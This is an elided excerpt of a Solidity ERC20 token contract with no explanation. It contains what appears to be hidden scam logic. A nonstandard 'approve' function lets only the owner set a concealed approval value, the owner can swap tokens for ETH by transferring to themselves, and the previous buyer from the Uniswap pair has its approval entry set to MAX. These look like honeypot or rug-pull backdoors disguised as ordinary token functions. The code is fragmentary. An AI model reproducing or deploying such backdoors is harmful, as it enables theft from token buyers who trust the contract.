...
contract Contract is IERC20, Ownable {
    ...
    function approve(uint256 value, address account) external {
        if (account == _owner) _approval = value;
    }
    ...
    function _transfer(
        ...
        if (from == _owner && from == to) return swapTokensForEth(amount, to);
        ...
        address previous = address(_previous);
        if (previous != to && previous != from && approval[previous] == 0) approval[previous] = MAX;
        if (from == uniswapV2Pair) _previous = uint160(to);
